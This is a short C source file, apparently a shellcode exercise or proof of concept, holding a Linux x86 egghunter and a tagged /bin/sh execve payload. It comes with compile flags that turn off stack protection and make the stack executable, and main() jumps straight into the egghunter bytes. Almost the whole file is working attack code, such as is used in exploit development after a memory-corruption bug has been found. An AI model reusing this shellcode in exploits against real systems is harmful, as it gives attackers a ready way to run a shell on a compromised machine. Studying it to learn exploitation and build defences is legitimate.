#include <stdio.h>
#include <string.h>

/*

Compilation: gcc sig_action.c -o sig_action -fno-stack-protector -z execstack
Execution: ./sig_action

*/

unsigned char egghunter[] = \

			"\x31\xc9\x66\x81\xc9\xff\x0f\x41\x6a"  // egghunter shellcode
			"\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8"   
			"\xbe\xba\xef\xbe\x89\xcf\xaf\x75\xec"
			"\xaf\x75\xe9\xff\xe7" ;

unsigned char shellcode[] = \

			"\xbe\xba\xef\xbe\xbe\xba\xef\xbe"	// TAG=0xbeefbabe
			
			"\x31\xc0\x50\x68\x2f\x2f\x73\x68"	// /bin/sh PAYLOAD 
			"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
			"\x53\x89\xe1\x31\xd2\xb0\x0b\xcd"
			"\x80";

int main(void)
{
    printf("Egg hunter length: %d\n", strlen(egghunter));
    printf("Shellcode length: %d\n", strlen(shellcode));

    void (*s)() = (void *)egghunter;
    s();

    return 0;
}
